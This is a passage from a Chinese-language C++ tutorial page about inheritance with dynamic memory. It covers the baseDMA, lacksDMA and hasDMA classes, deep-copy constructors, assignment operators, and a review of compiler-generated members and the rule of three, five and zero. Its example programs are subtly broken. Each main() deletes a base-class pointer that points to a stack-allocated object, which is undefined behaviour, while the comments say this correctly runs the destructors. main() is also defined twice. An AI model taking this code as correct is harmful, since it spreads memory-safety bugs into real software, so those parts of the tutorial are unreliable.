class="keyword">enum</span> &#123;</span> COL_LEN = <span class="number">40</span> &#125;;</span><br><span class="line">    <span class="keyword">char</span> color[COL_LEN];</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    lacksDMA(<span class="keyword">const</span> <span class="keyword">char</span> * c = <span class="string">&quot;blank&quot;</span>, <span class="keyword">const</span> <span class="keyword">char</span> * l = <span class="string">&quot;null&quot;</span>, <span class="keyword">int</span> r = <span class="number">0</span>);</span><br><span class="line">    lacksDMA(<span class="keyword">const</span> <span class="keyword">char</span> * c, <span class="keyword">const</span> baseDMA &amp; rs);</span><br><span class="line">    <span class="comment">// 不需要自定义析构函数、复制构造函数、赋值运算符</span></span><br><span class="line">    <span class="keyword">friend</span> <span class="built_in">std</span>::ostream &amp; <span class="keyword">operator</span>&lt;&lt;(<span class="built_in">std</span>::ostream &amp; os, <span class="keyword">const</span> lacksDMA &amp; ls);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">// DMA_H_</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// dma.cpp -- 实现</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;dma.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// --- baseDMA 实现 ---</span></span><br><span class="line">baseDMA::baseDMA(<span class="keyword">const</span> <span class="keyword">char</span> * l, <span class="keyword">int</span> r) &#123;</span><br><span class="line">    label = <span class="keyword">new</span> <span class="keyword">char</span>[<span class="built_in">std</span>::<span class="built_in">strlen</span>(l) + <span class="number">1</span>];</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">strcpy</span>(label, l);</span><br><span class="line">    rating = r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">baseDMA::baseDMA(<span class="keyword">const</span> baseDMA &amp; rs) &#123; <span class="comment">// 深复制</span></span><br><span class="line">    label = <span class="keyword">new</span> <span class="keyword">char</span>[<span class="built_in">std</span>::<span class="built_in">strlen</span>(rs.label) + <span class="number">1</span>];</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">strcpy</span>(label, rs.label);</span><br><span class="line">    rating = rs.rating;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">baseDMA::~baseDMA() &#123;</span><br><span class="line">    <span class="keyword">delete</span> [] label;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">baseDMA &amp; baseDMA::<span class="keyword">operator</span>=(<span class="keyword">const</span> baseDMA &amp; rs) &#123; <span class="comment">// 深复制赋值</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span> == &amp;rs)</span><br><span class="line">        <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">    <span class="keyword">delete</span> [] label; <span class="comment">// 释放旧内存</span></span><br><span class="line">    label = <span class="keyword">new</span> <span class="keyword">char</span>[<span class="built_in">std</span>::<span class="built_in">strlen</span>(rs.label) + <span class="number">1</span>];</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">strcpy</span>(label, rs.label);</span><br><span class="line">    rating = rs.rating;</span><br><span class="line">    <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">std</span>::ostream &amp; <span class="keyword">operator</span>&lt;&lt;(<span class="built_in">std</span>::ostream &amp; os, <span class="keyword">const</span> baseDMA &amp; rs) &#123;</span><br><span class="line">    os &lt;&lt; <span class="string">&quot;Label: &quot;</span> &lt;&lt; rs.label &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    os &lt;&lt; <span class="string">&quot;Rating: &quot;</span> &lt;&lt; rs.rating &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> os;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// --- lacksDMA 实现 ---</span></span><br><span class="line">lacksDMA::lacksDMA(<span class="keyword">const</span> <span class="keyword">char</span> * c, <span class="keyword">const</span> <span class="keyword">char</span> * l, <span class="keyword">int</span> r)</span><br><span class="line">    : baseDMA(l, r) &#123; <span class="comment">// 调用基类构造函数</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">strncpy</span>(color, c, COL_LEN - <span class="number">1</span>);</span><br><span class="line">    color[COL_LEN - <span class="number">1</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">lacksDMA::lacksDMA(<span class="keyword">const</span> <span class="keyword">char</span> * c, <span class="keyword">const</span> baseDMA &amp; rs)</span><br><span class="line">    : baseDMA(rs) &#123; <span class="comment">// 调用基类复制构造函数</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">strncpy</span>(color, c, COL_LEN - <span class="number">1</span>);</span><br><span class="line">    color[COL_LEN - <span class="number">1</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">std</span>::ostream &amp; <span class="keyword">operator</span>&lt;&lt;(<span class="built_in">std</span>::ostream &amp; os, <span class="keyword">const</span> lacksDMA &amp; ls) &#123;</span><br><span class="line">    <span class="comment">// 调用基类的 operator&lt;&lt; (需要友元或类型转换，或者直接访问)</span></span><br><span class="line">    <span class="comment">// 这里假设通过类型转换或直接调用基类方法</span></span><br><span class="line">    os &lt;&lt; (<span class="keyword">const</span> baseDMA &amp;) ls; <span class="comment">// 将派生类引用转换为基类引用来调用基类 operator&lt;&lt;</span></span><br><span class="line">    os &lt;&lt; <span class="string">&quot;Color: &quot;</span> &lt;&lt; ls.color &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> os;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// usedma.cpp -- 使用示例</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;dma.h&quot;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">cout</span>;</span><br><span class="line">    <span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="function">baseDMA <span class="title">shirt</span><span class="params">(<span class="string">&quot;Portabelly&quot;</span>, <span class="number">8</span>)</span></span>;</span><br><span class="line">    <span class="function">lacksDMA <span class="title">balloon</span><span class="params">(<span class="string">&quot;red&quot;</span>, <span class="string">&quot;Blimpo&quot;</span>, <span class="number">4</span>)</span></span>; <span class="comment">// 派生类对象</span></span><br><span class="line">    <span class="function">lacksDMA <span class="title">balloon2</span><span class="params">(balloon)</span></span>; <span class="comment">// 使用默认复制构造函数</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Displaying baseDMA object:\n&quot;</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; shirt;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Displaying lacksDMA object:\n&quot;</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; balloon;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Result of lacksDMA copy:\n&quot;</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; balloon2;</span><br><span class="line"></span><br><span class="line">    baseDMA * p_dma = &amp;balloon; <span class="comment">// 基类指针指向派生类</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Deleting derived object via base pointer:\n&quot;</span>;</span><br><span class="line">    <span class="keyword">delete</span> p_dma; <span class="comment">// 正确调用 ~lacksDMA() (默认) 然后 ~baseDMA() (虚函数)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="13-7-2-第二种情况：派生类使用-new"><a href="#13-7-2-第二种情况：派生类使用-new" class="headerlink" title="13.7.2 第二种情况：派生类使用 new"></a>13.7.2 第二种情况：派生类使用 <code>new</code></h3><p>如果派生类<strong>也</strong>使用了 <code>new</code> 来分配自己的动态内存，那么派生类<strong>必须</strong>提供自己的析构函数、复制构造函数和赋值运算符。</p><ul><li><p><strong>析构函数 (<code>~Derived()</code>):</strong></p><ul><li>  必须显式定义。</li><li>  负责 <code>delete</code> 或 <code>delete[]</code> <strong>派生类自己分配</strong>的内存。</li><li>  不需要（也不能）显式调用基类的析构函数；基类析构函数会在派生类析构函数执行完毕后<strong>自动</strong>被调用。</li><li>  基类析构函数仍应是 <code>virtual</code>。</li></ul></li><li><p><strong>复制构造函数 (<code>Derived(const Derived &amp;)</code>):</strong></p><ul><li>  必须显式定义。</li><li>  在<strong>成员初始化列表</strong>中，必须显式调用<strong>基类的复制构造函数</strong> <code>Base(other)</code> 来完成基类部分的深复制。</li><li>  然后，在构造函数体中，为派生类自己管理的动态内存执行深复制（分配新内存，复制数据）。</li></ul></li><li><p><strong>赋值运算符 (<code>Derived &amp; operator=(const Derived &amp;)</code>):</strong></p><ul><li>  必须显式定义。</li><li>  <strong>检查自我赋值</strong>。</li><li>  显式调用<strong>基类的赋值运算符</strong> <code>Base::operator=(other)</code> 来完成基类部分的深复制赋值。</li><li>  释放<strong>派生类当前对象</strong>的旧动态内存。</li><li>  为派生类当前对象的动态成员分配新内存，并从源对象复制数据。</li><li>  返回 <code>*this</code>。</li></ul></li></ul><p><strong>示例 (添加 hasDMA 类):</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// dma.h (续)</span></span><br><span class="line"><span class="comment">// 派生类 - 使用 new</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">hasDMA</span> :</span> <span class="keyword">public</span> baseDMA &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">char</span> * style; <span class="comment">// 派生类管理的动态内存</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    hasDMA(<span class="keyword">const</span> <span class="keyword">char</span> * s = <span class="string">&quot;none&quot;</span>, <span class="keyword">const</span> <span class="keyword">char</span> * l = <span class="string">&quot;null&quot;</span>, <span class="keyword">int</span> r = <span class="number">0</span>);</span><br><span class="line">    hasDMA(<span class="keyword">const</span> <span class="keyword">char</span> * s, <span class="keyword">const</span> baseDMA &amp; rs);</span><br><span class="line">    hasDMA(<span class="keyword">const</span> hasDMA &amp; hs); <span class="comment">// 复制构造函数</span></span><br><span class="line">    ~hasDMA(); <span class="comment">// 析构函数</span></span><br><span class="line">    hasDMA &amp; <span class="keyword">operator</span>=(<span class="keyword">const</span> hasDMA &amp; hs); <span class="comment">// 赋值运算符</span></span><br><span class="line">    <span class="keyword">friend</span> <span class="built_in">std</span>::ostream &amp; <span class="keyword">operator</span>&lt;&lt;(<span class="built_in">std</span>::ostream &amp; os, <span class="keyword">const</span> hasDMA &amp; hs);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// dma.cpp (续)</span></span><br><span class="line"><span class="comment">// --- hasDMA 实现 ---</span></span><br><span class="line">hasDMA::hasDMA(<span class="keyword">const</span> <span class="keyword">char</span> * s, <span class="keyword">const</span> <span class="keyword">char</span> * l, <span class="keyword">int</span> r)</span><br><span class="line">    : baseDMA(l, r) &#123; <span class="comment">// 调用基类构造函数</span></span><br><span class="line">    style = <span class="keyword">new</span> <span class="keyword">char</span>[<span class="built_in">std</span>::<span class="built_in">strlen</span>(s) + <span class="number">1</span>];</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">strcpy</span>(style, s);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">hasDMA::hasDMA(<span class="keyword">const</span> <span class="keyword">char</span> * s, <span class="keyword">const</span> baseDMA &amp; rs)</span><br><span class="line">    : baseDMA(rs) &#123; <span class="comment">// 调用基类复制构造函数</span></span><br><span class="line">    style = <span class="keyword">new</span> <span class="keyword">char</span>[<span class="built_in">std</span>::<span class="built_in">strlen</span>(s) + <span class="number">1</span>];</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">strcpy</span>(style, s);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">hasDMA::hasDMA(<span class="keyword">const</span> hasDMA &amp; hs)</span><br><span class="line">    : baseDMA(hs) &#123; <span class="comment">// *** 调用基类复制构造函数 ***</span></span><br><span class="line">    style = <span class="keyword">new</span> <span class="keyword">char</span>[<span class="built_in">std</span>::<span class="built_in">strlen</span>(hs.style) + <span class="number">1</span>]; <span class="comment">// 深复制派生类成员</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">strcpy</span>(style, hs.style);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">hasDMA::~hasDMA() &#123;</span><br><span class="line">    <span class="keyword">delete</span> [] style; <span class="comment">// 释放派生类分配的内存 (基类析构函数会自动调用)</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">hasDMA &amp; hasDMA::<span class="keyword">operator</span>=(<span class="keyword">const</span> hasDMA &amp; hs) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span> == &amp;hs)</span><br><span class="line">        <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">    baseDMA::<span class="keyword">operator</span>=(hs); <span class="comment">// *** 调用基类赋值运算符 ***</span></span><br><span class="line">    <span class="keyword">delete</span> [] style;        <span class="comment">// 释放派生类旧内存</span></span><br><span class="line">    style = <span class="keyword">new</span> <span class="keyword">char</span>[<span class="built_in">std</span>::<span class="built_in">strlen</span>(hs.style) + <span class="number">1</span>]; <span class="comment">// 深复制派生类成员</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">strcpy</span>(style, hs.style);</span><br><span class="line">    <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">std</span>::ostream &amp; <span class="keyword">operator</span>&lt;&lt;(<span class="built_in">std</span>::ostream &amp; os, <span class="keyword">const</span> hasDMA &amp; hs) &#123;</span><br><span class="line">    os &lt;&lt; (<span class="keyword">const</span> baseDMA &amp;) hs; <span class="comment">// 显示基类部分</span></span><br><span class="line">    os &lt;&lt; <span class="string">&quot;Style: &quot;</span> &lt;&lt; hs.style &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 显示派生类部分</span></span><br><span class="line">    <span class="keyword">return</span> os;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// usedma.cpp (续)</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// ... (之前的代码) ...</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nTesting hasDMA:\n&quot;</span>;</span><br><span class="line">    <span class="function">hasDMA <span class="title">map</span><span class="params">(<span class="string">&quot;Mercator&quot;</span>, <span class="string">&quot;Buffalo Keys&quot;</span>, <span class="number">5</span>)</span></span>;</span><br><span class="line">    hasDMA map2 = <span class="built_in">map</span>; <span class="comment">// 调用 hasDMA 复制构造函数</span></span><br><span class="line">    hasDMA map3;</span><br><span class="line">    map3 = <span class="built_in">map</span>; <span class="comment">// 调用 hasDMA 赋值运算符</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Displaying hasDMA object:\n&quot;</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="built_in">map</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Result of hasDMA copy:\n&quot;</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; map2;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Result of hasDMA assignment:\n&quot;</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; map3;</span><br><span class="line"></span><br><span class="line">    baseDMA * p_dma2 = &amp;<span class="built_in">map</span>; <span class="comment">// 基类指针指向派生类</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Deleting derived object via base pointer:\n&quot;</span>;</span><br><span class="line">    <span class="keyword">delete</span> p_dma2; <span class="comment">// 正确调用 ~hasDMA() 然后 ~baseDMA()</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="13-7-3-使用动态内存分配和友元的继承示例"><a href="#13-7-3-使用动态内存分配和友元的继承示例" class="headerlink" title="13.7.3 使用动态内存分配和友元的继承示例"></a>13.7.3 使用动态内存分配和友元的继承示例</h3><p>在上面的 <code>lacksDMA</code> 和 <code>hasDMA</code> 示例中，我们重载了 <code>operator&lt;&lt;</code> 作为友元函数。当在派生类的友元函数中需要显示基类信息时，有几种方法：</p><ol><li> <strong>使用基类的公有/保护接口:</strong> 如果基类提供了访问所需信息的 <code>public</code> 或 <code>protected</code> 方法，友元函数可以通过派生类对象调用这些方法。</li><li> <strong>使用类型转换:</strong> 将派生类对象的引用强制转换为基类对象的引用 <code>(const baseDMA &amp;) hs</code>，然后调用基类版本的 <code>operator&lt;&lt;</code>。这要求基类 <code>operator&lt;&lt;</code> 也是友元或能够通过公有接口访问所需信息。</li><li> <strong>让派生类的友元也是基类的友元:</strong> 这种方式比较少见，且增加了耦合度。</li></ol><p>在示例中，我们使用了类型转换 <code>(const baseDMA &amp;) hs</code> 来调用基类的 <code>operator&lt;&lt;</code>，这是一种常见的做法。</p><p><strong>总结:</strong></p><ul><li>  当派生类不使用 <code>new</code> 时，通常依赖基类正确实现的虚析构函数、复制构造函数和赋值运算符即可。</li><li>  当派生类也使用 <code>new</code> 时，派生类必须提供自己的析构函数、复制构造函数和赋值运算符。</li><li>  派生类的析构函数负责清理派生类资源，基类析构函数自动调用。</li><li>  派生类的复制构造函数必须在初始化列表中调用基类复制构造函数。</li><li>  派生类的赋值运算符必须显式调用基类赋值运算符。</li><li>  <strong>基类析构函数应始终为虚函数</strong>，以确保通过基类指针 <code>delete</code> 派生类对象时行为正确。</li></ul><h2 id="13-8-类设计回顾"><a href="#13-8-类设计回顾" class="headerlink" title="13.8 类设计回顾"></a>13.8 类设计回顾</h2><p>经过前面几章的学习，我们已经接触了 C++ 类设计的许多方面，从基础的封装到复杂的继承和动态内存管理。本节将回顾一些关键的设计决策和最佳实践。</p><h3 id="13-8-1-编译器生成的成员函数"><a href="#13-8-1-编译器生成的成员函数" class="headerlink" title="13.8.1 编译器生成的成员函数"></a>13.8.1 编译器生成的成员函数</h3><p>C++ 编译器可以为我们自动生成一些特殊的成员函数，但这并不总是足够的，尤其是在处理资源（如动态内存）或设计继承层次结构时。</p><ol><li><p><strong>默认构造函数 (Default Constructor):</strong></p><ul><li>  <strong>生成时机:</strong> 如果你<strong>没有</strong>声明任何构造函数。</li><li>  <strong>行为:</strong> 对成员执行默认初始化（内置类型不初始化，类类型调用其默认构造函数）。</li><li>  <strong>注意:</strong> 如果你定义了任何构造函数，编译器就不会生成默认构造函数。如果此时你还需要一个无参构造函数，必须自己定义。</li></ul></li><li><p><strong>析构函数 (Destructor):</strong></p><ul><li>  <strong>生成时机:</strong> 如果你没有声明析构函数。</li><li>  <strong>行为:</strong> 对类类型的成员调用它们的析构函数。</li><li>  <strong>注意:</strong> 如果类管理需要显式释放的资源（如 <code>new</code> 分配的内存），<strong>必须</strong>提供自定义析构函数。如果类打算作为基类，析构函数<strong>应该</strong>是 <code>virtual</code> 的。</li></ul></li><li><p><strong>复制构造函数 (Copy Constructor):</strong></p><ul><li>  <strong>生成时机:</strong> 如果你没有声明复制构造函数（且没有声明移动操作）。</li><li>  <strong>行为:</strong> 执行**成员逐一复制 (浅复制)**。对于类类型成员，调用其复制构造函数。</li><li>  <strong>注意:</strong> 如果类管理动态内存或包含不能简单复制的资源（如文件句柄），<strong>必须</strong>提供自定义复制构造函数以实现<strong>深复制</strong>。</li></ul></li><li><p><strong>复制赋值运算符 (Copy Assignment Operator):</strong></p><ul><li>  <strong>生成时机:</strong> 如果你没有声明复制赋值运算符（且没有声明移动操作）。</li><li>  <strong>行为:</strong> 执行**成员逐一赋值 (浅复制)**。对于类类型成员，调用其复制赋值运算符。</li><li>  <strong>注意:</strong> 如果类管理动态内存或需要特殊赋值逻辑，<strong>必须</strong>提供自定义复制赋值运算符，确保深复制、处理自我赋值并释放旧资源。</li></ul></li><li><p><strong>移动构造函数 (Move Constructor) (C++11):</strong></p><ul><li>  <strong>生成时机:</strong> 如果你<strong>没有</strong>声明任何复制操作（复制构造、复制赋值）、移动操作（移动构造、移动赋值）或析构函数。</li><li>  <strong>行为:</strong> 执行<strong>成员逐一移动</strong>。对于类类型成员，调用其移动构造函数。目的是高效地转移资源所有权，而不是复制。</li><li>  <strong>注意:</strong> 如果需要自定义资源转移逻辑，或者默认的成员移动不合适，可以自定义。如果定义了任何复制操作或析构函数，默认的移动构造函数通常不会生成，需要时需显式 <code>= default</code> 或自定义。</li></ul></li><li><p><strong>移动赋值运算符 (Move Assignment Operator) (C++11):</strong></p><ul><li>  <strong>生成时机:</strong> 与移动构造函数类似。</li><li>  <strong>行为:</strong> 执行<strong>成员逐一移动赋值</strong>。</li><li>  <strong>注意:</strong> 与移动构造函数类似，如果需要自定义或默认版本未生成，需显式处理。</li></ul></li></ol><p><strong>三/五/零法则 (Rule of Three/Five/Zero):</strong></p><ul><li>  <strong>三法则 (C++11 前):</strong> 如果你需要自定义析构函数、复制构造函数或复制赋值运算符中的<strong>任何一个</strong>，你几乎肯定需要<strong>全部三个</strong>。</li><li>  <strong>五法则 (C++11):</strong> 如果你需要自定义上述三个或移动构造函数/移动赋值运算符中的<strong>任何一个</strong>，你可能需要考虑<strong>全部五个</strong>。</li><li>  <strong>零法则 (推荐):</strong> 优先使用 RAII（资源获取即初始化）原则，利用标准库容器（<code>std::string</code>, <code>std::vector</code>）和智能指针（<code>std::unique_ptr</code>, <code>std::shared_ptr</code>）来管理资源。如果类只包含这些能自我管理的成员，通常<strong>不需要</strong>自定义任何特殊成员函数，编译器生成的默认版本就能很好地工作。</li></ul><h3 id="13-8-2-其他的类方法"><a href="#13-8-2-其他的类方法" class="headerlink" title="13.8.2 其他的类方法"></a>13.8.2 其他的类方法</h3><p>除了特殊成员函数，类还包含其他用于实现其功能的方法：</p><ol><li> <strong>构造函数 (Constructors):</strong> 除了默认构造函数，还可以定义多个构造函数来提供不同的对象初始化方式（例如，接受不同参数）。使用成员初始化列表来初始化成员变量。考虑使用 <code>explicit</code> 关键字阻止不期望的单参数隐式转换。</li><li> <strong>访问器 (Accessors):</strong> 通常是 <code>public const</code> 成员函数，用于获取对象的状态（私有数据成员的值），但不修改对象。例如 <code>Balance() const</code>。</li><li> <strong>修改器 (Mutators) / 设置器 (Setters):</strong> 用于修改对象状态（私有数据成员的值）的 <code>public</code> 成员函数。例如 <code>ResetTable(bool v)</code>。</li><li> <strong>功能函数 (Utility Functions):</strong> 实现类核心逻辑的其他成员函数。可以是 <code>public</code>, <code>protected</code>, 或 <code>private</code>。</li><li> <strong><code>const</code> 成员函数:</strong> 在函数声明和定义后加 <code>const</code>，表示该函数不会修改调用它的对象的状态（数据成员）。<code>const</code> 对象只能调用 <code>const</code> 成员函数。</li><li> <strong>静态成员函数 (<code>static</code>):</strong> 与类本身关联，而不是特定对象。没有 <code>this</code> 指针，只能访问静态成员。通过类名调用 (<code>ClassName::staticFunc()</code>)。</li><li> <strong>虚函数 (<code>virtual</code>):</strong> 用于在继承层次结构中实现多态。允许通过基类指针/引用调用派生类的特定实现。</li></ol><h3 id="13-8-3-公有继承的考虑因素"><a href="#13-8-3-公有继承的考虑因素" class="headerlink" title="13.8.3 公有继承的考虑因素"></a>13.8.3 公有继承的考虑因素</h3><p>公有继承是实现 “is-a” 关系和多态的关键，但需要仔细考虑：</p><ol><li> <strong>“is-a” 关系:</strong> 确保派生类确实是基类的一种特殊类型，并且符合基类的行为契约（Liskov 替换原则）。</li><li> <strong>虚析构函数:</strong> 如果类可能被用作基类（特别是如果可能通过基类指针 <code>delete</code> 派生类对象），<strong>必须</strong>将析构函数声明为 <code>virtual</code>。</li><li><strong>继承接口 vs. 实现:</strong><ul><li>  <strong>纯虚函数:</strong> 只继承接口，强制派生类提供实现（用于抽象基类）。</li><li>  <strong>虚函数 (有实现):</strong> 继承接口和默认实现，允许派生类覆盖默认实现。</li><li>  <strong>非虚函数:</strong> 继承接口和强制实现，派生类不应重新定义（覆盖非虚函数通常是坏打算）。</li></ul></li><li><strong>访问控制:</strong><ul><li>  <code>public</code> 成员构成类的公有接口。</li><li>  <code>private</code> 成员是实现细节，对派生类隐藏。</li><li>  <code>protected</code> 成员对派生类可见，但对外部隐藏。谨慎使用 <code>protected</code> 数据，它会增加基类和派生类之间的耦合。优先使用 <code>protected</code> 函数。</li></ul></li><li> <strong>构造函数和初始化:</strong> 派生类构造函数必须调用基类构造函数（通常在成员初始化列表中）来初始化基类部分。</li><li> <strong>赋值运算符:</strong> 派生类的赋值运算符需要显式调用基类的赋值运算符来处理基类部分。</li><li> <strong>对象切片 (Slicing):</strong> 如果将派生类对象直接按值赋给基类对象（<code>Base b = derived;</code>），派生类特有的部分会被“切掉”，只保留基类部分。这是需要避免的，通常应使用指针或引用来处理多态对象。</li></ol><h3 id="13-8-4-类函数小结"><a href="#13-8-4-类函数小结" class="headerlink" title="13.8.4 类函数小结"></a>13.8.4 类函数小结</h3><table><thead><tr><th align="left">函数类别</th><th align="left">目的与说明</th><th align="left">关键特性/关键字</th></tr></thead><tbody><tr><td align="left"><strong>构造函数</strong></td><td align="left">初始化新创建的对象</td><td align="left">类名相同, 无返回类型, 可重载, <code>explicit</code></td></tr><tr><td align="left"><strong>析构函数</strong></td><td align="left">对象销毁前执行清理工作（释放资源）</td><td align="left"><code>~ClassName()</code>, 无参数, 无返回类型, <code>virtual</code></td></tr><tr><td align="left"><strong>复制构造函数</strong></td><td align="left">用同类对象初始化新对象</td><td align="left"><code>ClassName(const ClassName &amp;)</code>, 深复制</td></tr><tr><td align="left"><strong>复制赋值运算符</strong></td><td align="left">将一个已存在的同类对象赋给另一个</td><td align="left"><code>operator=(const ClassName &amp;)</code>, 深复制, 返回 <code>*this</code></td></tr><tr><td align="left"><strong>移动构造函数</strong></td><td align="left">用同类右值对象初始化新对象（转移资源）</td><td align="left"><code>ClassName(ClassName &amp;&amp;)</code>, C++11, 移动语义</td></tr><tr><td align="left"><strong>移动赋值运算符</strong></td><td align="left">将一个同类右值对象赋给另一个（转移资源）</td><td align="left"><code>operator=(ClassName &amp;&amp;)</code>, C++11, 移动语义</td></tr><tr><td align="left"><strong>普通成员函数</strong></td><td align="left">实现类的行为和功能</td><td align="left">隐式 <code>this</code> 指针</td></tr><tr><td align="left"><strong><code>const</code> 成员函数</strong></td><td align="left">访问对象状态，但不修改对象</td><td align="left">函数声明/定义后加 <code>const</code></td></tr><tr><td align="left"><strong><code>static</code> 成员函数</strong></td><td align="left">与类本身关联，而非特定对象</td><td align="left"><code>static</code>, 无 <code>this</code> 指针</td></tr><tr><td align="left"><strong><code>virtual</code> 函数</strong></td><td align="left">允许在派生类中覆盖，实现多态</td><td align="left"><code>virtual</code>, 动态联编</td></tr><tr><td align="left"><strong>纯虚函数</strong></td><td align="left">定义接口，强制派生类实现（用于 ABC）</td><td align="left"><code>virtual ... = 0;</code></td></tr><tr><td align="left"><strong>运算符重载函数</strong></td><td 